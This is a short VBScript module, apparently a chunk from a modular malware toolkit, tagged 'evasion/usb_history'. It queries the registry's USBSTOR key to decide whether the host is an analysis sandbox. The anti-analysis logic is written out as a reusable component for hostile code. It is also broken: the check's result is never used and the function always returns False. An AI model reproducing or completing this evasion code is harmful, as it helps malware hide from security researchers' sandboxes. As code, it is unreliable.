' chunk: evasion/usb_history
' depends: core/run_cmd
' provides: check_usb
' format: vbscript
' note: Registry USB history check, no USB devices suggests sandbox

Function check_usb()
    check_usb = False
    On Error Resume Next
    Dim result
    result = _run("reg query HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR")
    If Len(result) < 20 Then
        ' no USB history found
    End If
End Function
